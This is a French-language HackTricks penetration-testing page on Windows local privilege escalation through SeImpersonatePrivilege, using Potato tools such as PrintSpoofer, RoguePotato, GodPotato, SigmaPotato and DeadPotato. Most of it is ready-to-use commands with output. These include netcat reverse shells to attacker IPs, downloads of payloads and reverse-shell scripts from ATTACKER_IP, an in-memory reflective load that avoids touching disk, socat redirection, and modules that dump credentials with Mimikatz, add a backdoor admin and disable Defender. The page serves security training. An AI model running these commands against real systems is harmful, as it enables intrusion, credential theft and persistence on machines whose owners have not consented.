# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne fonctionne pas** sur Windows Server 2019 et Windows 10 build 1809 et versions ultérieures. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)** et [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** peuvent être utilisés pour **exploiter les mêmes privilèges et obtenir un accès de niveau `NT AUTHORITY\SYSTEM`**. Cet [article de blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) détaille l'outil `PrintSpoofer`, qui peut être utilisé pour exploiter les privilèges d'emprunt d'identité sur les hôtes Windows 10 et Server 2019 où JuicyPotato ne fonctionne plus.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Une alternative moderne fréquemment maintenue en 2024–2025 est SigmaPotato (un fork de GodPotato), qui ajoute l'utilisation de la réflexion in-memory/.NET ainsi qu'une prise en charge étendue des systèmes d'exploitation. Consultez l'utilisation rapide ci-dessous et le repo dans les Références.

Pages associées pour le contexte et les techniques manuelles :

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Prérequis et pièges courants

Toutes les techniques suivantes reposent sur l'exploitation d'un service privilégié capable d'emprunt d'identité depuis un contexte détenant l'un de ces privilèges :

- SeImpersonatePrivilege (le plus courant) ou SeAssignPrimaryTokenPrivilege
- Un niveau d'intégrité élevé n'est pas requis si le token possède déjà SeImpersonatePrivilege (cas typique pour de nombreux comptes de service tels que IIS AppPool, MSSQL, etc.)

Vérifiez rapidement les privilèges :
```cmd
whoami /priv | findstr /i impersonate
```
Notes opérationnelles :

- Si votre shell s’exécute sous un token restreint dépourvu de SeImpersonatePrivilege (fréquent pour Local Service/Network Service dans certains contextes), récupérez les privilèges par défaut du compte avec FullPowers, puis exécutez un Potato. Exemple : `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer nécessite que le service Print Spooler soit en cours d’exécution et accessible via le endpoint RPC local (spoolss). Dans les environnements renforcés où Spooler est désactivé à la suite de PrintNightmare, préférez RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato nécessite un résolveur OXID accessible sur TCP/135. Si la sortie réseau est bloquée, utilisez un redirector/port-forwarder (voir l’exemple ci-dessous). Les anciennes versions nécessitaient le flag -f.
- EfsPotato/SharpEfsPotato exploitent MS-EFSR ; si un pipe est bloqué, essayez d’autres pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- L’erreur 0x6d3 lors de RpcBindingSetAuthInfo indique généralement un service d’authentification RPC inconnu/non pris en charge ; essayez un autre pipe/transport ou vérifiez que le service cible est en cours d’exécution.
- Les forks « Kitchen-sink » tels que DeadPotato intègrent des modules de payload supplémentaires (Mimikatz/SharpHound/Defender off) qui écrivent sur le disque ; attendez-vous à une détection EDR plus élevée par rapport aux versions originales allégées.

## Démo rapide

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notes :
- Vous pouvez utiliser -i pour lancer un processus interactif dans la console actuelle, ou -c pour exécuter une commande en une ligne.
- Nécessite le service Spooler. S'il est désactivé, l'opération échouera.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si le port 135 sortant est bloqué, faites transiter le résolveur OXID via socat sur votre redirector :<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato est un primitive d’abus de COM plus récent, publié fin 2022, qui cible le service **PrintNotify** au lieu de Spooler/BITS. Le binaire instancie le serveur COM PrintNotify, remplace `IUnknown` par une version falsifiée, puis déclenche un callback privilégié via `CreatePointerMoniker`. Lorsque le service PrintNotify (exécuté en tant que **SYSTEM**) se reconnecte, le processus duplique le token retourné et lance le payload fourni avec des privilèges complets.<sup>[[13]](#references)</sup>

Points opérationnels importants :

* Fonctionne sur Windows 10/11 et Windows Server 2012–2022 tant que le service Print Workflow/PrintNotify est installé (il est présent même lorsque le Spooler legacy est désactivé après PrintNightmare).
* Nécessite que le contexte appelant détienne `SeImpersonatePrivilege` (cas typique pour IIS APPPOOL, MSSQL et les comptes de service des tâches planifiées).
* Accepte soit une commande directe, soit un mode interactif permettant de rester dans la console d’origine. Exemple :

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Comme il repose entièrement sur COM, aucun listener de named pipe ni redirecteur externe n’est nécessaire, ce qui en fait un remplacement direct sur les hôtes où Defender bloque le RPC binding de RoguePotato.

Des groupes tels qu’Ink Dragon exécutent PrintNotifyPotato immédiatement après avoir obtenu un ViewState RCE sur SharePoint afin de passer du worker `w3wp.exe` à SYSTEM avant d’installer ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Astuce : si un pipe échoue ou si l’EDR le bloque, essayez les autres pipes pris en charge :
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notes :
- Fonctionne sur Windows 8/8.1–11 et Server 2012–2022 lorsque SeImpersonatePrivilege est présent.
- Récupérez le binaire correspondant au runtime installé (par exemple, `GodPotato-NET4.exe` sur un Server 2022 moderne).
- Si votre primitive d’exécution initiale est un webshell/UI avec des délais d’expiration courts, préparez le payload sous forme de script et demandez à GodPotato de l’exécuter plutôt que d’utiliser une commande inline longue.<sup>[[12]](#references)</sup>

Méthode de staging rapide depuis un webroot IIS accessible en écriture :
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fournit deux variantes ciblant les objets DCOM de service qui utilisent par défaut RPC_C_IMP_LEVEL_IMPERSONATE. Compilez les binaires fournis ou utilisez-les, puis exécutez votre commande :
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato ajoute des fonctionnalités modernes comme l’exécution en mémoire via la réflexion .NET et un helper de reverse shell PowerShell.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Avantages supplémentaires dans les builds 2024–2025 (v1.2.x) :
- Flag reverse shell intégré `--revshell` et suppression de la limite PowerShell de 1024 caractères, ce qui permet de lancer de longs payloads de contournement d’AMSI en une seule fois.
- Syntaxe compatible avec la réflexion (`[SigmaPotato]::Main()`), ainsi qu’une astuce rudimentaire d’évasion AV via `VirtualAllocExNuma()` pour déjouer les heuristiques simples.
- `SigmaPotatoCore.exe` séparé, compilé pour .NET 2.0 afin de fonctionner dans les environnements PowerShell Core.

### DeadPotato (rework de GodPotato de 2024 avec modules)

DeadPotato conserve la chaîne d’impersonation OXID/DCOM de GodPotato, mais intègre des helpers de post-exploitation afin que les opérateurs puissent immédiatement obtenir SYSTEM et effectuer de la persistence/collection sans outils supplémentaires.<sup>[[15]](#references)</sup>

Modules courants (tous nécessitent SeImpersonatePrivilege) :

- `-cmd "<cmd>"` — lancer une commande arbitraire en tant que SYSTEM.
- `-rev <ip:port>` — reverse shell rapide.
- `-newadmin user:pass` — créer un administrateur local pour la persistence.
- `-mimi sam|lsa|all` — déposer et exécuter Mimikatz pour dumper les credentials (écrit sur le disque, bruyant).
- `-sharphound` — exécuter la collecte SharpHound en tant que SYSTEM.
- `-defender off` — désactiver la protection en temps réel de Defender (très bruyant).

Exemples de one-liners :
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Comme il embarque des binaires supplémentaires, attendez-vous à davantage de détections par l’AV/EDR ; utilisez le GodPotato/SigmaPotato plus léger lorsque la discrétion est importante.

## Références

- [1] [PrintSpoofer – Abuser des privilèges d’impersonation sur Windows 10 et Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Fini JuicyPotato ? Une ancienne histoire, bienvenue à RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Restaurer les privilèges par défaut des tokens pour les comptes de service](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — leak NTLM de WMP → junction NTFS vers la webroot pour une RCE → FullPowers + GodPotato vers SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — macro LibreOffice → webshell IIS → GodPotato vers SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Inside Ink Dragon: révélation du réseau de relais et du fonctionnement interne d’une opération offensive discrète](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Refonte de GodPotato avec des modules post-exploitation intégrés](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
